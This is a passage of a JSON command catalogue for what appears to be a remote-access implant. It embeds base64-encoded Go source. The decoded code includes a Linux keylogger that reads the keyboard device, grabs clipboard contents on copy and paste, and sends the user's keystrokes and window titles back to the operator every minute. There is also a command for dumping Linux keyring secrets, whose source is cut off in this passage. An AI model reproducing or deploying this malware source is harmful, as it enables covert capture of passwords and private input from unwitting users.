29udGFpbnMoc3RyaW5ncy5Ub0xvd2VyKHN0cmluZyhidWZmKSksICJrZXlib2FyZCIpIHsKCQkJcmV0dXJuIGZtdC5TcHJpbnRmKHJlc29sdmVkLCBpKQoJCX0KCX0KCXJldHVybiAiIgp9CgovLyBJc1Jvb3QgY2hlY2tzIGlmIHRoZSBwcm9jZXNzIGlzIHJ1biB3aXRoIHJvb3QgcGVybWlzc2lvbgpmdW5jIChrICpLZXlMb2dnZXIpIElzUm9vdCgpIGJvb2wgewoJcmV0dXJuIHN5c2NhbGwuR2V0dWlkKCkgPT0gMCAmJiBzeXNjYWxsLkdldGV1aWQoKSA9PSAwCn0KCi8vIFJlYWQgZnJvbSBmaWxlIGRlc2NyaXB0b3IKLy8gQmxvY2tpbmcgY2FsbCwgcmV0dXJucyBjaGFubmVsCi8vIE1ha2Ugc3VyZSB0byBjbG9zZSBjaGFubmVsIHdoZW4gZmluaXNoCmZ1bmMgKGsgKktleUxvZ2dlcikgUmVhZCgpIGNoYW4gSW5wdXRFdmVudCB7CglldmVudCA6PSBtYWtlKGNoYW4gSW5wdXRFdmVudCkKCWdvIGZ1bmMoZXZlbnQgY2hhbiBJbnB1dEV2ZW50KSB7CgkJZm9yIHsKCQkJZSwgZXJyIDo9IGsucmVhZCgpCgkJCWlmIGVyciAhPSBuaWwgewoJCQkJbG9nLlByaW50bG4oZXJyLkVycm9yKCkpCgkJCQljbG9zZShldmVudCkKCQkJCWJyZWFrCgkJCX0KCgkJCWlmIGUgIT0gbmlsIHsKCQkJCWV2ZW50IDwtICplCgkJCX0KCQl9Cgl9KGV2ZW50KQoJcmV0dXJuIGV2ZW50Cn0KCi8vIHJlYWQgZnJvbSBmaWxlIGRlc2NyaXB0aW9uIGFuZCBwYXJzZSBiaW5hcnkgaW50byBnbyBzdHJ1Y3QKZnVuYyAoayAqS2V5TG9nZ2VyKSByZWFkKCkgKCpJbnB1dEV2ZW50LCBlcnJvcikgewoJYnVmZmVyIDo9IG1ha2UoW11ieXRlLCBldmVudHNpemUpCgluLCBlcnIgOj0gay5mZC5SZWFkKGJ1ZmZlcikKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiBuaWwsIGVycgoJfQoJLy8gbm8gaW5wdXQsIGRvbnQgc2VuZCBlcnJvcgoJaWYgbiA8PSAwIHsKCQlyZXR1cm4gbmlsLCBuaWwKCX0KCXJldHVybiBrLmV2ZW50RnJvbUJ1ZmZlcihidWZmZXIpCn0KCi8vIGV2ZW50RnJvbUJ1ZmZlciBwYXJzZXIgYnl0ZXMgaW50byBJbnB1dEV2ZW50IHN0cnVjdApmdW5jIChrICpLZXlMb2dnZXIpIGV2ZW50RnJvbUJ1ZmZlcihidWZmZXIgW11ieXRlKSAoKklucHV0RXZlbnQsIGVycm9yKSB7CglldmVudCA6PSAmSW5wdXRFdmVudHt9CgllcnIgOj0gYmluYXJ5LlJlYWQoYnl0ZXMuTmV3QnVmZmVyKGJ1ZmZlciksIGJpbmFyeS5MaXR0bGVFbmRpYW4sIGV2ZW50KQoJcmV0dXJuIGV2ZW50LCBlcnIKfQoKLy8gQ2xvc2UgZmlsZSBkZXNjcmlwdG9yCmZ1bmMgKGsgKktleUxvZ2dlcikgQ2xvc2UoKSBlcnJvciB7CglpZiBrLmZkID09IG5pbCB7CgkJcmV0dXJuIG5pbAoJfQoJcmV0dXJuIGsuZmQuQ2xvc2UoKQp9Cgp2YXIga2V5Q29kZU1hcCA9IG1hcFt1aW50MTZdc3RyaW5newoJMTogICAiRVNDIiwKCTI6ICAgIjEiLAoJMzogICAiMiIsCgk0OiAgICIzIiwKCTU6ICAgIjQiLAoJNjogICAiNSIsCgk3OiAgICI2IiwKCTg6ICAgIjciLAoJOTogICAiOCIsCgkxMDogICI5IiwKCTExOiAgIjAiLAoJMTI6ICAiLSIsCgkxMzogICI9IiwKCTE0OiAgIkJTIiwKCTE1OiAgIlRBQiIsCgkxNjogICJRIiwKCTE3OiAgIlciLAoJMTg6ICAiRSIsCgkxOTogICJSIiwKCTIwOiAgIlQiLAoJMjE6ICAiWSIsCgkyMjogICJVIiwKCTIzOiAgIkkiLAoJMjQ6ICAiTyIsCgkyNTogICJQIiwKCTI2OiAgIlsiLAoJMjc6ICAiXSIsCgkyODogICJFTlRFUiIsCgkyOTogICJMX0NUUkwiLAoJMzA6ICAiQSIsCgkzMTogICJTIiwKCTMyOiAgIkQiLAoJMzM6ICAiRiIsCgkzNDogICJHIiwKCTM1OiAgIkgiLAoJMzY6ICAiSiIsCgkzNzogICJLIiwKCTM4OiAgIkwiLAoJMzk6ICAiOyIsCgk0MDogICInIiwKCTQxOiAgImAiLAoJNDI6ICAiTF9TSElGVCIsCgk0MzogICJcXCIsCgk0NDogICJaIiwKCTQ1OiAgIlgiLAoJNDY6ICAiQyIsCgk0NzogICJWIiwKCTQ4OiAgIkIiLAoJNDk6ICAiTiIsCgk1MDogICJNIiwKCTUxOiAgIiwiLAoJNTI6ICAiLiIsCgk1MzogICIvIiwKCTU0OiAgIlJfU0hJRlQiLAoJNTU6ICAiKiIsCgk1NjogICJMX0FMVCIsCgk1NzogICJTUEFDRSIsCgk1ODogICJDQVBTX0xPQ0siLAoJNTk6ICAiRjEiLAoJNjA6ICAiRjIiLAoJNjE6ICAiRjMiLAoJNjI6ICAiRjQiLAoJNjM6ICAiRjUiLAoJNjQ6ICAiRjYiLAoJNjU6ICAiRjciLAoJNjY6ICAiRjgiLAoJNjc6ICAiRjkiLAoJNjg6ICAiRjEwIiwKCTY5OiAgIk5VTV9MT0NLIiwKCTcwOiAgIlNDUk9MTF9MT0NLIiwKCTcxOiAgIkhPTUUiLAoJNzI6ICAiVVBfOCIsCgk3MzogICJQR1VQXzkiLAoJNzQ6ICAiLSIsCgk3NTogICJMRUZUXzQiLAoJNzY6ICAiNSIsCgk3NzogICJSVF9BUlJPV182IiwKCTc4OiAgIisiLAoJNzk6ICAiRU5EXzEiLAoJODA6ICAiRE9XTiIsCgk4MTogICJQR0ROXzMiLAoJODI6ICAiSU5TIiwKCTgzOiAgIkRFTCIsCgk4NDogICIiLAoJODU6ICAiIiwKCTg2OiAgIiIsCgk4NzogICJGMTEiLAoJODg6ICAiRjEyIiwKCTg5OiAgIiIsCgk5MDogICIiLAoJOTE6ICAiIiwKCTkyOiAgIiIsCgk5MzogICIiLAoJOTQ6ICAiIiwKCTk1OiAgIiIsCgk5NjogICJSX0VOVEVSIiwKCTk3OiAgIlJfQ1RSTCIsCgk5ODogICIvIiwKCTk5OiAgIlBSVF9TQ1IiLAoJMTAwOiAiUl9BTFQiLAoJMTAxOiAiIiwKCTEwMjogIkhvbWUiLAoJMTAzOiAiVXAiLAoJMTA0OiAiUGdVcCIsCgkxMDU6ICJMZWZ0IiwKCTEwNjogIlJpZ2h0IiwKCTEwNzogIkVuZCIsCgkxMDg6ICJEb3duIiwKCTEwOTogIlBnRG4iLAoJMTEwOiAiSW5zZXJ0IiwKCTExMTogIkRlbCIsCgkxMTI6ICIiLAoJMTEzOiAiIiwKCTExNDogIiIsCgkxMTU6ICIiLAoJMTE2OiAiIiwKCTExNzogIiIsCgkxMTg6ICIiLAoJMTE5OiAiUGF1c2UiLAp9CgpmdW5jIGtleXN0YXRlTW9uaXRvcihrICpLZXlMb2dnZXIpIHsKCWRlZmVyIGsuQ2xvc2UoKQoKCS8vIENyZWF0ZSB0ZW1wIGZpbGUgZm9yIHJlY29yZGluZyByZXN1bHRzLgoJLy8gdG1wZmlsZSwgZXJyIDo9IGlvdXRpbC5UZW1wRmlsZSgiL3RtcC8iLCAidG1wLiIpCgkvLyBpZiBlcnIgIT0gbmlsIHsKCS8vIAlsb2cuRmF0YWwoZXJyKQoJLy8gfQoKCS8vIGxvZ3J1cy5QcmludGxuKCJJbml0aWFsaXplZCBsb2cgZmlsZToiLCB0bXBmaWxlLk5hbWUoKSkKCglldmVudHMgOj0gay5SZWFkKCkKCglsX2NudHJsIDo9IGZhbHNlCgljIDo9IGZhbHNlCglzaGlmdCA6PSBmYWxzZQoJY2Fwc2xvY2sgOj0gZmFsc2UKCXZhciBrZXljaGFyIHN0cmluZwoJLy8gcmFuZ2Ugb2YgZXZlbnRzCgkvLyBsb2dydXMuUHJpbnRsbigiSW5pdGlhbGl6ZWQuIExpc3RlbmluZyBmb3IgZXZlbnRzLi4uIikKCWZvciBlIDo9IHJhbmdlIGV2ZW50cyB7CgkJaWYgKmN1clRhc2suSm9iLlN0b3AgPiAwIHsKCQkJYnJlYWsKCQl9CgkJc3dpdGNoIGUuVHlwZSB7CgkJLy8gRXZLZXkgaXMgdXNlZCB0byBkZXNjcmliZSBzdGF0ZSBjaGFuZ2VzIG9mIGtleWJvYXJkcywgYnV0dG9ucywgb3Igb3RoZXIga2V5LWxpa2UgZGV2aWNlcy4KCQkvLyBjaGVjayB0aGUgaW5wdXRfZXZlbnQuZ28gZm9yIG1vcmUgZXZlbnRzCgkJY2FzZSBFdktleToKCgkJCS8vIGlmIHRoZSBzdGF0ZSBvZiBrZXkgaXMgcHJlc3NlZAoJCQlpZiBlLktleVByZXNzKCkgewoJCQkJa2V5Y2hhciA9IGUuS2V5U3RyaW5nKCkKCQkJCWlmIGtleWNoYXIgPT0gIkxfQ1RSTCIgewoJCQkJCWxfY250cmwgPSB0cnVlCgkJCQl9IGVsc2UgaWYga2V5Y2hhciA9PSAiQyIgJiYgbF9jbnRybCB7CgkJCQkJYyA9IHRydWUKCQkJCX0gZWxzZSBpZiBsX2NudHJsICYmIGtleWNoYXIgIT0gIkMiIHsKCQkJCQlsX2NudHJsID0gZmFsc2UKCQkJCQljID0gZmFsc2UKCQkJCX0gZWxzZSBpZiBrZXljaGFyID09ICJMX1NISUZUIiB8fCBrZXljaGFyID09ICJSX1NISUZUIiB7CgkJCQkJc2hpZnQgPSB0cnVlCgkJCQl9IGVsc2UgaWYga2V5Y2hhciA9PSAiQ0FQU19MT0NLIiB7CgkJCQkJY2Fwc2xvY2sgPSAhY2Fwc2xvY2sKCQkJCX0KCQkJCWlmIGtleWNoYXIgPT0gIlNQQUNFIiB7CgkJCQkJa3Ntb25pdG9yLkFkZEtleVN0cm9rZXMoIiAiKQoJCQkJCS8vIGZtdC5QcmludCgiICIpCgkJCQl9IGVsc2UgewoJCQkJCWlmIGxlbihrZXljaGFyKSA+IDEgJiYga2V5Y2hhciAhPSAiTF9TSElGVCIgJiYga2V5Y2hhciAhPSAiUl9TSElGVCIgewoJCQkJCQlrc21vbml0b3IuQWRkS2V5U3Ryb2tlcygiWyIgKyBrZXljaGFyICsgIl0iKQoJCQkJCQkvLyBmbXQuUHJpbnRmKCJbJXNdIiwga2V5Y2hhcikKCQkJCQl9IGVsc2UgewoJCQkJCQlpZiBsX2NudHJsICYmIGMgewoJCQkJCQkJY29udGVudHMsIGVyciA6PSBjbGlwYm9hcmQuUmVhZEFsbCgpCgkJCQkJCQlpZiBlcnIgPT0gbmlsIHsKCQkJCQkJCQlrc21vbml0b3IuQWRkS2V5U3Ryb2tlcygiW0NPUFldIiArIGNvbnRlbnRzICsgIlsvQ09QWV0iKQoJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQlsb2cuUHJpbnRsbihlcnIuRXJyb3IoKSkKCQkJCQkJCX0KCQkJCQkJfSBlbHNlIGlmIGxfY250cmwgJiYga2V5Y2hhciA9PSAiUCIgewoJCQkJCQkJY29udGVudHMsIGVyciA6PSBjbGlwYm9hcmQuUmVhZEFsbCgpCgkJCQkJCQlpZiBlcnIgPT0gbmlsIHsKCQkJCQkJCQlrc21vbml0b3IuQWRkS2V5U3Ryb2tlcygiW1BBU1RFXSIgKyBjb250ZW50cyArICJbL1BBU1RFXSIpCgkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCWxvZy5QcmludGxuKGVyci5FcnJvcigpKQoJCQkJCQkJfQoJCQkJCQl9IGVsc2UgaWYgc2hpZnQgewoJCQkJCQkJaWYgSXNMZXR0ZXIoa2V5Y2hhcikgewoJCQkJCQkJCWtzbW9uaXRvci5BZGRLZXlTdHJva2VzKGtleWNoYXIpCgkJCQkJCQkJLy8gZm10LlByaW50KGtleWNoYXIpCgkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCWtzbW9uaXRvci5BZGRLZXlTdHJva2VzKHNoaWZ0TWFwW3N0cmluZ3MuVG9Mb3dlcihrZXljaGFyKV0pCgkJCQkJCQkJLy8gZm10LlByaW50KHNoaWZ0TWFwW2tleWNoYXJdKQoJCQkJCQkJfQoJCQkJCQl9IGVsc2UgaWYgY2Fwc2xvY2sgewoJCQkJCQkJa3Ntb25pdG9yLkFkZEtleVN0cm9rZXMoa2V5Y2hhcikKCQkJCQkJCS8vIGZtdC5QcmludChrZXljaGFyKQoJCQkJCQl9IGVsc2UgewoJCQkJCQkJa3Ntb25pdG9yLkFkZEtleVN0cm9rZXMoc3RyaW5ncy5Ub0xvd2VyKGtleWNoYXIpKQoJCQkJCQkJLy8gZm10LlByaW50KHN0cmluZ3MuVG9Mb3dlcihrZXljaGFyKSkKCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJCWlmIGtleWNoYXIgPT0gIkVOVEVSIiB7CgkJCQkJa3Ntb25pdG9yLkFkZEtleVN0cm9rZXMoIlxuIikKCQkJCX0KCQkJCS8vIGxvZ3J1cy5QcmludGxuKCJbZXZlbnRdIHByZXNzIGtleSAiLCBlLktleVN0cmluZygpKQoJCQl9CgoJCQkvLyBpZiB0aGUgc3RhdGUgb2Yga2V5IGlzIHJlbGVhc2VkCgkJCWlmIGUuS2V5UmVsZWFzZSgpIHsKCQkJCWtleWNoYXIgPSBlLktleVN0cmluZygpCgkJCQlpZiBrZXljaGFyID09ICJMX1NISUZUIiB8fCBrZXljaGFyID09ICJSX1NISUZUIiB7CgkJCQkJc2hpZnQgPSBmYWxzZQoJCQkJfQoJCQkJLy8gbG9ncnVzLlByaW50bG4oIltldmVudF0gcmVsZWFzZSBrZXkgIiwgZS5LZXlTdHJpbmcoKSkKCQkJfQoKCQkJYnJlYWsKCQl9Cgl9Cn0KCmZ1bmMga2V5TG9nZ2VyKCkgZXJyb3IgewoJa2V5Ym9hcmQgOj0gRmluZEtleWJvYXJkRGV2aWNlKCkKCgkvLyBjaGVjayBpZiB3ZSBmb3VuZCBhIHBhdGggdG8ga2V5Ym9hcmQKCWlmIGxlbihrZXlib2FyZCkgPD0gMCB7CgkJcmV0dXJuIGVycm9ycy5OZXcoIk5vIGtleWJvYXJkIGZvdW5kLi4ueW91IHdpbGwgbmVlZCB0byBwcm92aWRlIG1hbnVhbCBpbnB1dCBwYXRoIikKCX0KCgkvLyBsb2dydXMuUHJpbnRsbigiRm91bmQgYSBrZXlib2FyZCBhdCIsIGtleWJvYXJkKQoJLy8gaW5pdCBrZXlsb2dnZXIgd2l0aCBrZXlib2FyZAoJaywgZXJyIDo9IE5ldyhrZXlib2FyZCkKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiBlcnIKCX0KCWdvIGtleXN0YXRlTW9uaXRvcihrKQoJcmV0dXJuIG5pbAp9CgpmdW5jIElzTGV0dGVyKHMgc3RyaW5nKSBib29sIHsKCWZvciBfLCByIDo9IHJhbmdlIHMgewoJCWlmICF1bmljb2RlLklzTGV0dGVyKHIpIHsKCQkJcmV0dXJuIGZhbHNlCgkJfQoJfQoJcmV0dXJuIHRydWUKfQo="
            },
            {
              "keystate\/keystate.go": "cGFja2FnZSBrZXlzdGF0ZQoKaW1wb3J0ICgKCSJlbmNvZGluZy9qc29uIgoJImVycm9ycyIKCSJmbXQiCgoJLy8ibG9nIgoJIm9zL3VzZXIiCgkic3luYyIKCSJ0aW1lIgoKCSJwa2cvdXRpbHMvc3RydWN0cyIKCSJwa2cvcHJvZmlsZXMiCikKCnZhciAoCgljdXJUYXNrICpzdHJ1Y3RzLlRhc2sKCS8vIFN0cnVjdCB0byBtb25pdG9yIGtleXN0cm9rZXMuCglrc21vbml0b3IsIF8gPSBOZXdLZXlMb2coKQoJLy8gTWFwcyBzdHJpbmdzIHRvIHRoZWlyIHNoaWZ0IGNvdW50ZXItcGFydHMgb24gVVMga2V5Ym9hcmRzLgoJc2hpZnRNYXAgPSBtYXBbc3RyaW5nXXN0cmluZ3sKCQkiYSI6ICAiQSIsCgkJImIiOiAgIkIiLAoJCSJjIjogICJDIiwKCQkiZCI6ICAiRCIsCgkJImUiOiAgIkUiLAoJCSJmIjogICJGIiwKCQkiZyI6ICAiRyIsCgkJImgiOiAgIkgiLAoJCSJpIjogICJJIiwKCQkiaiI6ICAiSiIsCgkJImsiOiAgIksiLAoJCSJsIjogICJMIiwKCQkibSI6ICAiTSIsCgkJIm4iOiAgIk4iLAoJCSJvIjogICJPIiwKCQkicCI6ICAiUCIsCgkJInEiOiAgIlEiLAoJCSJyIjogICJSIiwKCQkicyI6ICAiUyIsCgkJInQiOiAgIlQiLAoJCSJ1IjogICJVIiwKCQkidiI6ICAiViIsCgkJInciOiAgIlciLAoJCSJ4IjogICJYIiwKCQkieSI6ICAiWSIsCgkJInoiOiAgIloiLAoJCSIxIjogICIhIiwKCQkiMiI6ICAiQCIsCgkJIjMiOiAgIiMiLAoJCSI0IjogICIkIiwKCQkiNSI6ICAiJSIsCgkJIjYiOiAgIl4iLAoJCSI3IjogICImIiwKCQkiOCI6ICAiKiIsCgkJIjkiOiAgIigiLAoJCSIwIjogICIpIiwKCQkiLSI6ICAiXyIsCgkJIj0iOiAgIisiLAoJCSJbIjogICJ7IiwKCQkiXSI6ICAifSIsCgkJIlxcIjogInwiLAoJCSI7IjogICI6IiwKCQkiJyI6ICAiXCIiLAoJCSIsIjogICI8IiwKCQkiLiI6ICAiPiIsCgkJIi8iOiAgIj8iLAoJCSJgIjogICJ+IiwKCX0KKQoKdHlwZSBLZXlMb2cgc3RydWN0IHsKCVVzZXIgICAgICAgIHN0cmluZyBganNvbjoidXNlciJgCglXaW5kb3dUaXRsZSBzdHJpbmcgYGpzb246IndpbmRvd190aXRsZSJgCglLZXlzdHJva2VzICBzdHJpbmcgYGpzb246ImtleXN0cm9rZXMiYAoJbXR4ICAgICAgICAgc3luYy5NdXRleAp9Cgp0eXBlIHNlcmlhbGl6YWJsZUtleUxvZyBzdHJ1Y3QgewoJVXNlciAgICAgICAgc3RyaW5nIGBqc29uOiJ1c2VyImAKCVdpbmRvd1RpdGxlIHN0cmluZyBganNvbjoid2luZG93X3RpdGxlImAKCUtleXN0cm9rZXMgIHN0cmluZyBganNvbjoia2V5c3Ryb2tlcyJgCn0KCmZ1bmMgKGsgKktleUxvZykgQWRkS2V5U3Ryb2tlcyhzIHN0cmluZykgewoJay5tdHguTG9jaygpCglrLktleXN0cm9rZXMgKz0gcwoJay5tdHguVW5sb2NrKCkKfQoKZnVuYyAoayAqS2V5TG9nKSBUb1NlcmlhbFN0cnVjdCgpIHNlcmlhbGl6YWJsZUtleUxvZyB7CglyZXR1cm4gc2VyaWFsaXphYmxlS2V5TG9newoJCVVzZXI6ICAgICAgICBrLlVzZXIsCgkJV2luZG93VGl0bGU6IGsuV2luZG93VGl0bGUsCgkJS2V5c3Ryb2tlczogIGsuS2V5c3Ryb2tlcywKCX0KfQoKZnVuYyAoayAqS2V5TG9nKSBTZXRXaW5kb3dUaXRsZShzIHN0cmluZykgewoJay5tdHguTG9jaygpCglrLldpbmRvd1RpdGxlID0gcwoJay5tdHguVW5sb2NrKCkKfQoKZnVuYyAoayAqS2V5TG9nKSBTZW5kTWVzc2FnZSgpIHsKCXNlck1zZyA6PSBrc21vbml0b3IuVG9TZXJpYWxTdHJ1Y3QoKQoJbXNnIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJbXNnLlRhc2tJRCA9IGN1clRhc2suVGFza0lECglkYXRhLCBlcnIgOj0ganNvbi5NYXJzaGFsSW5kZW50KHNlck1zZywgIiIsICIgICAgIikKCS8vbG9nLlByaW50bG4oIlNlbmRpbmcgYWNyb3NzIHRoZSB3aXJlOiIsIHN0cmluZyhkYXRhKSkKCWlmIGVyciAhPSBuaWwgewoJCW1zZy5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQltc2cuU3RhdHVzID0gImVycm9yIgoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCX0gZWxzZSB7CgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCBkYXRhKQoJfQp9CgpmdW5jIE5ld0tleUxvZygpIChLZXlMb2csIGVycm9yKSB7CgljdXJVc2VyLCBlcnIgOj0gdXNlci5DdXJyZW50KCkKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiBLZXlMb2d7fSwgZXJyCgl9CglyZXR1cm4gS2V5TG9newoJCVVzZXI6ICAgICAgICBjdXJVc2VyLlVzZXJuYW1lLAoJCVdpbmRvd1RpdGxlOiAiIiwKCQlLZXlzdHJva2VzOiAgIiIsCgl9LCBuaWwKfQoKZnVuYyBTdGFydEtleWxvZ2dlcih0YXNrIHN0cnVjdHMuVGFzaykgZXJyb3IgewoJLy8gVGhpcyBmdW5jdGlvbiBpcyByZXNwb25zaWJsZSBmb3IgZHVtcGluZyBvdXRwdXQuCglpZiBjdXJUYXNrICE9IG5pbCAmJiBjdXJUYXNrLkpvYi5Nb25pdG9yaW5nIHsKCQlyZXR1cm4gZXJyb3JzLk5ldyhmbXQuU3ByaW50ZigiS2V5bG9nZ2VyIGFscmVhZHkgcnVubmluZyB3aXRoIHRhc2sgSUQ6ICVzIiwgY3VyVGFzay5UYXNrSUQpKQoJfQoKCWdvIGZ1bmMoKSB7CgkJZm9yIHsKCQkJdGltZXIgOj0gdGltZS5OZXdUaW1lcih0aW1lLk1pbnV0ZSkKCQkJPC10aW1lci5DCgkJCWlmIGtzbW9uaXRvci5LZXlzdHJva2VzICE9ICIiIHsKCQkJCWtzbW9uaXRvci5tdHguTG9jaygpCgkJCQlrc21vbml0b3IuU2VuZE1lc3NhZ2UoKQoJCQkJa3Ntb25pdG9yLktleXN0cm9rZXMgPSAiIgoJCQkJa3Ntb25pdG9yLm10eC5VbmxvY2soKQoJCQl9CgkJCWlmICp0YXNrLkpvYi5TdG9wID4gMCB7CgkJCQlicmVhawoJCQl9CgkJfQoJfSgpCgllcnIgOj0ga2V5TG9nZ2VyKCkKCXJldHVybiBlcnIKfQo="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "jobkill SOME-GUID-GOES-HERE",
          "version": 3,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Kill a job with the specified ID - not all jobs are killable though",
          "cmd": "jobkill",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "jobkill.go": "cGFja2FnZSBqb2JraWxsCgp0eXBlIEFyZ3VtZW50cyBzdHJ1Y3QgewoJSUQgc3RyaW5nIGBqc29uOiJpZCJgCn0K"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "keys {\"command\":\"\",\"keyword\":\"only needed when searching\",\"typename\":\"only needed when searching\"}",
          "version": 7,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Interact with the linux keyring or the macOS keychain APIs",
          "cmd": "keys",
          "parameters": [
            {
              "type": "Choice",
              "hint": "",
              "choices": "keyring\nuser\nlogin\nlogon\nsession",
              "required": false,
              "name": "typename"
            },
            {
              "type": "String",
              "hint": "Name of the key to search for",
              "choices": "",
              "required": false,
              "name": "keyword"
            },
            {
              "type": "Choice",
              "hint": "",
              "choices": "dumpsession\ndumpuser\ndumpprocess\ndumpthreads\nsearch",
              "required": true,
              "name": "command"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "keys_darwin.go": "Ly8gK2J1aWxkIGRhcndpbgoKcGFja2FnZSBrZXlzCgp0eXBlIERhcndpbktleU9wZXJhdGlvbiBzdHJ1Y3QgewoJS2V5VHlwZSBzdHJpbmcKCUtleURhdGEgW11ieXRlCn0KCi8vIFRPRE86IEltcGxlbWVudCBmdW5jdGlvbiB0byBlbnVtZXJhdGUgbWFjb3Mga2V5Y2hhaW4KZnVuYyAoZCAqRGFyd2luS2V5T3BlcmF0aW9uKSBUeXBlKCkgc3RyaW5nIHsKCXJldHVybiBkLktleVR5cGUKfQoKZnVuYyAoZCAqRGFyd2luS2V5T3BlcmF0aW9uKSBEYXRhKCkgW11ieXRlIHsKCXJldHVybiBkLktleURhdGEKfQoKZnVuYyBnZXRrZXlkYXRhKG9wdCBPcHRpb25zKSAoRGFyd2luS2V5T3BlcmF0aW9uLCBlcnJvcikgewoJZCA6PSBEYXJ3aW5LZXlPcGVyYXRpb257fQoJcmV0dXJuIGQsIG5pbAp9Cg=="
            },
            {
              "keys.go": "cGFja2FnZSBrZXlzCgppbXBvcnQgKAoJImVuY29kaW5nL2pzb24iCgoJInBrZy91dGlscy9zdHJ1Y3RzIgoJInN5bmMiCgkicGtnL3Byb2ZpbGVzIgopCgp2YXIgbXUgc3luYy5NdXRleAoKLy9LZXlJbmZvcm1hdGlvbiAtIGludGVyZmFjZSBmb3Iga2V5IGRhdGEKdHlwZSBLZXlJbmZvcm1hdGlvbiBpbnRlcmZhY2UgewoJS2V5VHlwZSgpIHN0cmluZwoJRGF0YSgpIFtdYnl0ZQp9CgovL09wdGlvbnMgLSBvcHRpb25zIGZvciBrZXkgZGF0YSBjb21tYW5kCnR5cGUgT3B0aW9ucyBzdHJ1Y3QgewoJQ29tbWFuZCAgc3RyaW5nIGBqc29uOiJjb21tYW5kImAKCUtleXdvcmQgIHN0cmluZyBganNvbjoia2V5d29yZCJgCglUeXBlbmFtZSBzdHJpbmcgYGpzb246InR5cGVuYW1lImAKfQoKLy9SdW4gLSBleHRyYWN0IGtleSBkYXRhCmZ1bmMgUnVuKHRhc2sgc3RydWN0cy5UYXNrKSB7CgkvL0NoZWNrIGlmIHRoZSB0eXBlcyBhcmUgYXZhaWxhYmxlCgltc2cgOj0gc3RydWN0cy5SZXNwb25zZXt9Cgltc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCW9wdHMgOj0gT3B0aW9uc3t9CgllcnIgOj0ganNvbi5Vbm1hcnNoYWwoW11ieXRlKHRhc2suUGFyYW1zKSwgJm9wdHMpCgoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCXJlcywgZXJyIDo9IGdldGtleWRhdGEob3B0cykKCWlmIGVyciAhPSBuaWwgewoJCW1zZy5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCgltc2cuQ29tcGxldGVkID0gdHJ1ZQoJbXNnLlVzZXJPdXRwdXQgPSBzdHJpbmcocmVzLkRhdGEoKSkKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9Cg=="
            },
            {
              "keys_linux.go": "Ly8gK2J1aWxkIGxpbnV4CgpwYWNrYWdlIGtleXMKCmltcG9ydCAoCgkiZW5jb2RpbmcvYmFzZTY0IgoJImVuY29kaW5nL2pzb24iCgkibG9nIgoKCSJnaXRodWIuY29tL3hvcnJpb3Iva2V5Y3RsIgopCgovL0tleXJlc3VsdHMgLSBzdHJ1Y3QgdG8gaG9sZCBhcnJheSBvZiBrZXlzCnR5cGUgS2V5cmVzdWx0cyBzdHJ1Y3QgewoJUmVzdWx0cyBbXUtleWRldGFpbHMgYGpzb246InJlc3VsdHMiYAp9CgovL0tleWRldGFpbHMgLSBzdHJ1Y3QgdGhhdCBob2xkcyBpbmZvcm1hdGlvbiBhYm91dCBhIGtleQp0eXBlIEtleWRldGFpbHMgc3RydWN0IHsKCU5hbWUgICAgICAgIHN0cmluZyAgICAgICAgICAgIGBqc29uOiJuYW1lImAKCUlEICAgICAgICAgIGludDMyICAgICAgICAgICAgIGBqc29uOiJpZCJgCglQZXJtaXNzaW9ucyBQZXJtaXNza